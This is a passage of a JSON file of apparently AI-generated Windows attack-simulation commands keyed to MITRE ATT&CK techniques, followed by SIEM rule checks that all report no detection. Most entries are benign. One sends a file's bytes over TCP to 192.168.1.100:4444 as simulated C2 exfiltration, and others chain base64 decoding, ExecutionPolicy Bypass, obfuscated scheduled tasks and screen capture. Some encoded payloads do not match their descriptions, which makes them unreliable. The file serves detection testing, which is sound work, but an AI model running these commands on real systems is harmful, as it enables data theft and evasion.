      "expected_behavior": "The command enumerates all visible top\u2011level windows and prints their titles, e.g., \"Window Title: Microsoft Word - Document1\". It does not alter system state; only reads window information.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:28.502542",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "84518609-f17d-46e0-83f9-da407367456d",
      "ttp_id": "unknown",
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"time /T\"",
      "description": "Basic system time discovery using the built\u2011in cmd.exe utility. The `time /T` command prints the current system time in HH:MM format.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command outputs the current local system time to the console.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:29.530458",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "50fd54c5-17c5-4aee-b087-7c094c321e59",
      "ttp_id": "unknown",
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic os get LocalDateTime /value",
      "description": "Intermediate discovery using WMIC to retrieve the OS's `LocalDateTime` property, which includes date and time in a sortable format (YYYYMMDDhhmmss.mmmmmmsUUU).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "WMIC returns a line such as `LocalDateTime=20251220143015.000000+060` indicating the current system date and time.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:29.530458",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7d32a901-1acb-40f2-b7be-145ca8ea15d7",
      "ttp_id": "unknown",
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"(Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')\"",
      "description": "Advanced discovery via PowerShell, formatting the current UTC time in ISO\u20118601 (e.g., 2025-12-20T14:30:00Z).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "PowerShell prints the current UTC date\u2011time string in ISO\u20118601 format.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:29.530458",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4845b208-41e3-450d-af4a-1890e15bc728",
      "ttp_id": "unknown",
      "technique_id": "T1070.004",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo TestFile > %TEMP%\\testfile.txt && del /f /q %TEMP%\\testfile.txt\"",
      "description": "Creates a temporary file in %TEMP% and then deletes it using the built\u2011in `del` command with force and quiet flags. Demonstrates basic file deletion via cmd.exe.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The file %TEMP%\\testfile.txt is created and immediately removed. No error is shown due to the `/q` flag; the command succeeds silently.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:30.251593",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cb60d571-dd0c-4687-8e79-d5e9fb873a60",
      "ttp_id": "unknown",
      "technique_id": "T1070.004",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Remove-Item -Path \\\"$env:TEMP\\dummy.txt\\\" -Force -ErrorAction SilentlyContinue\"",
      "description": "Uses PowerShell's `Remove-Item` cmdlet to delete a file in the temporary directory. The `-Force` flag ensures deletion even if the file is read\u2011only, and `-ErrorAction SilentlyContinue` suppresses errors if the file does not exist.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "If %TEMP%\\dummy.txt exists, it is removed without prompting. If the file is missing, the command completes silently.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:30.251593",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "913b1625-151d-4b43-a0ce-6882a152bf33",
      "ttp_id": "unknown",
      "technique_id": "T1070.004",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic datafile where \"Name='C:\\\\Windows\\\\Temp\\\\sample.txt'\" delete",
      "description": "Leverages the built\u2011in `wmic` utility to invoke the WMI `Delete` method on a specific file. This mimics malware that uses the `unlink` API via WMI for file removal.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file C:\\Windows\\Temp\\sample.txt is deleted if it exists. No output is produced on success; errors are displayed only if the file cannot be found or access is denied.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:30.251593",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c4a40e8d-61e8-43e2-878e-a47fc8456c29",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process where \"name='cmd.exe'\" get CommandLine /format:list",
      "description": "Uses the built\u2011in wmic utility to enumerate the command\u2011line arguments of any running cmd.exe processes, capturing any user\u2011provided input that may be present in those arguments.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs a list of CommandLine values for each cmd.exe process; no changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:31.495374",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bd07e2ba-f021-428e-9e55-ec1262cc3754",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /SC ONLOGON /TN \"UserInputCapture\" /TR \"cmd.exe /c echo Captured > %TEMP%\\input.txt\" /RL LIMITED /F",
      "description": "Creates a scheduled task that runs at each user logon and writes a benign placeholder string to a file in %TEMP%. The task demonstrates the use of schtasks for input\u2011capture style activity without requiring elevated privileges.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A new scheduled task named \"UserInputCapture\" appears; on the next logon it creates %TEMP%\\input.txt containing the word \"Captured\". No malicious payload is executed.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:31.495374",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "353c78a8-1b10-455d-b9f3-45926ca6dda4",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer CaptureJob /download %TEMP%\\dummy.txt %TEMP%\\capture.bat && bitsadmin /complete CaptureJob",
      "description": "Leverages bitsadmin to create a BITS transfer job that downloads a benign dummy file to a .bat script location. The job simulates the use of bitsadmin for input\u2011capture related activity (e.g., staging a script that could read user input).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "BITS creates a transfer job named \"CaptureJob\", copies %TEMP%\\dummy.txt to %TEMP%\\capture.bat, and then marks the job as complete. No execution of the downloaded file occurs.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:31.495374",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d37539d1-10c8-43ae-9179-2e23b18dea61",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f http://example.com/test.txt %TEMP%\\test.txt",
      "description": "Uses the built\u2011in certutil utility to download a benign test file over HTTP and store it in the temporary directory. Demonstrates application\u2011layer protocol usage via a legacy binary.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file test.txt is retrieved from example.com and written to %TEMP%\\test.txt. No execution of the downloaded file occurs.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:32.791833",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "60ad9e59-2284-40e1-a62f-a670350c6de6",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer myDownload /download /priority normal http://example.com/test.txt %TEMP%\\test.txt",
      "description": "Leverages bitsadmin to perform an HTTP download of a test payload to the temporary folder. Bitsadmin operates over the BITS service, which uses HTTP/HTTPS (application\u2011layer) for data transfer.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "BITS creates a background transfer job named myDownload, downloads test.txt from the remote server, and saves it to %TEMP%\\test.txt. The job completes without executing the file.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:32.791833",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5727e8bf-5406-43e8-a0aa-50e2c7703a41",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$url='http://example.com/test.txt';$out=\\\"$env:TEMP\\\\test.txt\\\";Invoke-WebRequest -Uri $url -OutFile $out\"",
      "description": "Executes a PowerShell one\u2011liner that issues an Invoke-WebRequest call to fetch a test file over HTTP and writes it to the temp directory. Shows use of a PowerShell cmdlet for application\u2011layer communication when no suitable legacy binary exists.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell contacts example.com, downloads test.txt, and stores it at $env:TEMP\\test.txt. The command runs in the current user context and does not execute the downloaded content.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:32.792521",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "309d6e61-aac6-417e-b47d-7ccac1ea08d3",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe C:\\Temp\\test.dll,EntryPoint",
      "description": "Basic process injection using the built\u2011in rundll32.exe to load a benign DLL (test.dll) into the current process. This mimics an injection technique without performing any malicious actions.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "rundll32.exe loads test.dll and executes its EntryPoint function. The DLL contains only benign code (e.g., a simple message), so no harmful effect is observed.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:34.012649",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9503db67-28d9-45e9-8940-6b21d1541d61",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process call create \"rundll32.exe C:\\Temp\\test.dll,EntryPoint\"",
      "description": "Intermediate injection example using WMIC to spawn a new process that runs rundll32.exe with a DLL. WMIC creates the process from a non\u2011shell parent, which is typical of injection\u2011related activity.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "WMIC launches a new rundll32.exe process that loads test.dll. The DLL runs a harmless routine, allowing detection of the WMIC\u2011based process creation pattern.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:34.012649",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eea89391-a8f5-49c4-b468-d125cd88144b",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process notepad -PassThru | ForEach-Object { $proc = \\$_; $procId = $proc.Id; Write-Host 'Injecting into PID ' $procId ' (simulated)'; }\"",
      "description": "Advanced example using PowerShell to start a target process (notepad) and then simulate injection by printing a message that references the target PID. This mirrors the flow of a real injection script that would use OpenProcess/WriteProcessMemory APIs.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell launches notepad, captures its process object, extracts the PID, and writes a console message indicating a simulated injection. No actual memory manipulation occurs.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:34.012649",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "686cc1f8-709e-447f-a8e5-9ee376d231c9",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcATwBiAGZ1c2NhdGVkIFRlc3Qn",
      "description": "Executes a PowerShell command that writes a benign string to the console. The command is Base64\u2011encoded (UTF\u201116LE) to simulate obfuscation.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays 'Obfuscated Test' in the PowerShell output.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:35.237185",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2d2efffd-f596-4852-9d03-96cd00632c88",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode %TEMP%\\plain.txt %TEMP%\\encoded.txt -f && type %TEMP%\\encoded.txt",
      "description": "Uses certutil to Base64\u2011encode a benign text file, demonstrating file obfuscation. The encoded file is then displayed.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates plain.txt with test content, encodes it to encoded.txt, and prints the Base64 contents.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:35.237185",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f1e309b3-5892-484e-a036-e76ec5b77b12",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process call create \"powershell -EncodedCommand VABlAHMAdAAgAGkAbgAgAHAAaQBuAGcALgB0AHgAZAA=\"",
      "description": "Leverages wmic to launch a PowerShell process with an encoded command that writes 'Test in ping.txt' to a file, showcasing obfuscation via wmic and Base64.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates ping.txt in the current directory containing the text 'Test in ping.txt'.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:35.237185",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "962d7855-68f7-4bcf-b397-715abdff3dff",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode %TEMP%\\sample.txt %TEMP%\\sample.b64",
      "description": "Encodes a local file to Base64 using certutil, simulating data preparation for exfiltration.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates %TEMP%\\sample.b64 containing the Base64 representation of sample.txt.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:37.575997",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3646e744-a7c0-4e4f-a20a-48f7386b4eae",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /SC ONCE /ST 00:00 /TN \"ExfilTask\" /TR \"certutil -encode %TEMP%\\sample.txt %TEMP%\\sample.b64\" /RL LIMITED /F",
      "description": "Schedules a one\u2011time task that runs certutil to encode a file, launched by the schtasks service rather than a direct user shell.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a scheduled task named ExfilTask; when triggered it generates a Base64 file in %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:37.575997",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5f6f5d3b-56b0-4357-84b8-f07f88a2e9d3",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process call create \"powershell -NoProfile -Command \\\"$data=[IO.File]::ReadAllBytes('%TEMP%\\\\sample.txt');$client=[System.Net.Sockets.TcpClient]::new('192.168.1.100',4444);$stream=$client.GetStream();$stream.Write($data,0,$data.Length);$stream.Close();$client.Close()\\\"\"",
      "description": "Uses WMIC to spawn a PowerShell process that reads a file and sends its raw bytes over a TCP socket to a C2 server, demonstrating exfiltration over a C2 channel from a non\u2011standard parent process.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Opens a TCP connection to 192.168.1.100:4444 and transmits the contents of %TEMP%\\sample.txt; no files are written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:37.575997",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ec42c54f-d89b-4d2a-8d68-b17b2ffe1122",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand dwBoAG8AYQBtAGkA",
      "description": "Executes a harmless PowerShell command (whoami) that is Base64\u2011encoded using UTF\u201116LE, demonstrating obfuscation of the executed payload.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints the current user name to the console.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:40.271405",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a992f6da-12ce-4837-8e72-b23bf104ec8d",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "set \"b64=dwBoAG8AYQBtAGkA\" && echo %b64% > %TEMP%\\whoami.b64 && certutil -decode %TEMP%\\whoami.b64 %TEMP%\\whoami.ps1 && powershell -ExecutionPolicy Bypass -File %TEMP%\\whoami.ps1 && powershell -Command \"Remove-Item -Path '%TEMP%\\\\whoami.b64','%TEMP%\\\\whoami.ps1' -ErrorAction SilentlyContinue\"",
      "description": "Writes a Base64\u2011encoded PowerShell script (whoami) to a temporary file, decodes it with the built\u2011in certutil utility, runs the resulting script, and then cleans up the temporary files using PowerShell with silent error handling.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Decodes and runs a script that outputs the current user name, then removes the temporary files without raising errors.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:40.271405",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8c7aa3a1-ea56-4e26-b34f-8d654d85abe2",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /TN \"ObfTask\" /TR \"powershell -EncodedCommand dwBoAG8AYQBtAGkA\" /SC ONCE /ST 00:00 /RL LIMITED && schtasks /Run /TN \"ObfTask\" && schtasks /Delete /TN \"ObfTask\" /F",
      "description": "Creates a scheduled task that runs an obfuscated PowerShell command (whoami) encoded in Base64, triggers the task immediately, and then deletes the task. Uses only built\u2011in schtasks.exe.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The scheduled task executes the encoded PowerShell command, printing the current user name, and the task is removed afterwards.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:40.271405",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2e949ca4-a696-4103-aed9-a7a9ddfd7768",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Test > %TEMP%\\\\test.txt\"",
      "description": "Creates a simple text file in the temporary directory using cmd.exe, simulating execution of a common utility from an unexpected parent process.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named test.txt containing the word 'Test' is written to %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:41.199411",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "42a99fdc-391e-4003-afa2-4cca649308ee",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process call create \"cmd.exe /c echo Intermediate > %TEMP%\\\\intermediate.txt\"",
      "description": "Uses WMIC to spawn a cmd.exe process that writes a file, demonstrating execution of a built\u2011in utility via an alternate parent process.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A file named intermediate.txt containing the word 'Intermediate' is created in %TEMP% via a WMIC\u2011initiated process.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:41.199411",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c6bbc1c7-da74-4100-8f6b-ff0c617b5d4d",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer myJob /download /priority normal \"C:\\\\Windows\\\\System32\\\\notepad.exe\" \"%TEMP%\\\\notepad_copy.exe\" && start \"\" \"%TEMP%\\\\notepad_copy.exe\"",
      "description": "Leverages BITSADMIN to copy a trusted system binary (notepad.exe) to the temp folder and then launches it, mimicking a malicious payload delivery via a legitimate utility.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Notepad.exe is copied to %TEMP% as notepad_copy.exe and then executed, opening a Notepad window.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:41.199411",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2946228a-d203-4e3d-ad88-9efb4dbb74a7",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"tar -a -c -f \\\"%TEMP%\\\\archive.zip\\\" \\\"%TEMP%\\\\sample.txt\\\"\"",
      "description": "Uses the built\u2011in Windows tar utility to create a ZIP archive of a single test file in the temporary directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named archive.zip is created in %TEMP% containing sample.txt. No elevated privileges are required.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:42.144310",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b2c58004-ebdc-4186-a433-f579b36595eb",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path \\\"$env:TEMP\\\\sample.txt\\\" -DestinationPath \\\"$env:TEMP\\\\archive.zip\\\" -Force\"",
      "description": "PowerShell cmdlet Compress-Archive creates a ZIP archive of a benign test file located in the temporary folder.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates $env:TEMP\\archive.zip containing sample.txt. Overwrites any existing archive without prompting.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:42.144310",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0f66e601-54c8-410f-ab78-2034deebcf73",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$files = Get-ChildItem -Path $env:TEMP -Filter '*.log'; $zipPath = \\\"$env:TEMP\\\\logs_archive.zip\\\"; if(Test-Path $zipPath){Remove-Item $zipPath -ErrorAction SilentlyContinue}; Compress-Archive -Path $files -DestinationPath $zipPath -Force\"",
      "description": "Collects all *.log files in the temp directory and compresses them into a single ZIP archive, removing any previous archive silently.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates logs_archive.zip in %TEMP% containing all .log files found there. If a prior archive exists it is deleted without error output.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:42.144310",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "72af3b80-a8c1-4272-843f-9effaac77dcd",
      "ttp_id": "unknown",
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -Command \"$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save('%TEMP%\\\\screenshot1.png');\"",
      "description": "Captures the primary display screen using .NET classes from PowerShell and saves the PNG image to the temporary directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named screenshot1.png is created in %TEMP% containing a bitmap of the current desktop.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:44.152462",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b569dc13-362a-45fb-939a-02c68a6c7fec",
      "ttp_id": "unknown",
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"psr.exe /start /output \\\"%TEMP%\\\\record.mht\\\" & timeout /t 5 >nul & psr.exe /stop\"",
      "description": "Starts the built\u2011in Problem Steps Recorder (psr.exe), records for 5 seconds, then stops and saves the .mht archive (which includes screen captures) to the temporary directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named record.mht is written to %TEMP% containing screenshots of the desktop captured during the 5\u2011second window.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:44.152462",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "518fd9b3-36d0-42ea-b5c0-2d79645d83c2",
      "ttp_id": "unknown",
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -Command \"$p = \\\"$env:TEMP\\\\screenshot3.png\\\"; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); $bmp.Save($p);\" && certutil -encode \"%TEMP%\\\\screenshot3.png\" \"%TEMP%\\\\screenshot3.b64\"",
      "description": "Advanced variant: captures a screenshot via PowerShell, then uses the native certutil utility to Base64\u2011encode the PNG file, producing a text representation for exfiltration testing.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates screenshot3.png in %TEMP% and a corresponding Base64\u2011encoded file screenshot3.b64 in the same directory.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:44.152462",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "rule_0",
      "attack_id": "07134903-57bd-4f89-86d0-e4a8bc55fa19",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 491.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_1",
      "attack_id": "3a36093d-b7ed-46ff-8beb-579ad6cb2411",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 492.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_2",
      "attack_id": "6b57d675-6d3c-416e-8a3c-aa19cb9f8ab5",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 286.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_3",
      "attack_id": "3d6a225f-ce87-4e76-83db-76d967d5e3d8",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 484.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_4",
      "attack_id": "9812aae3-9eee-4678-843b-e07df74b68e0",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 1113.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_5",
      "attack_id": "49c9b9f6-85ba-41bd-b004-b588a0a60b50",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 329.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_6",
      "attack_id": "dd223b63-47ed-4882-b98f-1d32b4244f3f",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 501.0,
      "status": "success",
      "message": "Verification complete"
    },
